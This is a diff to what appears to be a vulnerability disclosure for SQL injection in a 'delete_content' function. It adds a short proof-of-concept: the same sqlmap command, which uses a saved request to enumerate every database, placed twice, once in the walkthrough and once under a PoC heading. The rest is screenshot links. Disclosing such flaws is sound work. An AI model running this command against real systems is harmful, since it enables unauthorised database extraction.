@@ -6,10 +6,18 @@ Although `view_content` has an is_numeric that is not easy to inject, `delete_co
 ![image](https://github.com/user-attachments/assets/30b53243-13e3-489f-88f2-bbbf7faba852)
 
 We can use `sqlmap` to get all the data in the database:
+```bash
+sqlmap -r post.txt --dbs --batch
+```
+
 ![image](https://github.com/user-attachments/assets/4e957212-5220-4aca-a95a-dabb28bd9192)
 
 Complete process:
 ![d-toc-sqli1](https://github.com/user-attachments/assets/e4426cfb-49e1-4fe9-ab10-f325cd87ffa4)
 
 # PoC
+```bash
+sqlmap -r post.txt --dbs --batch
+```
+
 ![d-toc-sqli1](https://github.com/user-attachments/assets/e4426cfb-49e1-4fe9-ab10-f325cd87ffa4)
